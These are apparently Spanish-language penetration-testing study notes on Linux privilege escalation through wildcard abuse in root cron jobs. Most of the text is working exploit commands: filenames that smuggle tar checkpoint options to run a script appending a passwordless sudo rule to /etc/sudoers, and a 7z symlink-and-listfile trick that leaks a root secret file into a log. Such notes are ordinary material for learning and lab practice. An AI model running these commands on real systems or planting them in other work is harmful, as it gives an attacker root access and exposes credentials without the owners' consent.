---
tags: [privesc, linux, wildcard]
---

# Wildcard Abuse

## TAR

El flag `--checkpoint-action` de tar permite ejecutar una acción cuando se alcanza un checkpoint.

Si hay una tarea programada haciendo backups con `tar *` → se puede explotar.

```bash
# Ejemplo crontab vulnerable:
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

**Exploit:**

```bash
# 1. Script malicioso — añadir usuario a sudoers
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

# 2. Crear flags de tar como archivos (el * del cron las leerá como flags)
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

Cuando se ejecute el cron → el usuario gana sudo.

```bash
sudo -l
```

---

## 7z

Si una crontab de backup usa la contraseña de root al crear el ZIP:

```bash
# Crear link simbólico entre contraseña de root y un .zip en el directorio
ln -s /root/secret enox.zip
touch @enox.zip
```

Al ejecutarse la crontab, en el log aparece la contraseña de root en texto claro.

